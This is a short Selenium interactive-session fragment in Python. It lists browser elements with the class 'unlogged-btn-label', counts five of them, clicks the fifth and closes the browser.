[<selenium.webdriver.remote.webelement.WebElement (session="8f55bf24f44a1ca91591a5144bd51eb6", element="d52929e0-eb08-45f5-9605-d763fa9431df")>, <selenium.webdriver.remote.webelement.WebElement (session="8f55bf24f44a1ca91591a5144bd51eb6", element="2e91c900-c9bb-42f7-b5f3-bce6a89d02cb")>, <selenium.webdriver.remote.webelement.WebElement (session="8f55bf24f44a1ca91591a5144bd51eb6", element="26e1ab24-2e91-4bc6-a317-53d9622447b8")>, <selenium.webdriver.remote.webelement.WebElement (session="8f55bf24f44a1ca91591a5144bd51eb6", element="8e1530c3-2eac-41ab-a730-d73633886ae5")>, <selenium.webdriver.remote.webelement.WebElement (session="8f55bf24f44a1ca91591a5144bd51eb6", element="1a520c31-1ae5-4f62-8eef-7022af1afb90")>]
len(browser.find_elements_by_class_name("unlogged-btn-label"))
5
browser.find_elements_by_class_name("unlogged-btn-label")[4]
<selenium.webdriver.remote.webelement.WebElement (session="8f55bf24f44a1ca91591a5144bd51eb6", element="1a520c31-1ae5-4f62-8eef-7022af1afb90")>
browser.find_elements_by_class_name("unlogged-btn-label")[4].click()
browser.close()


"""
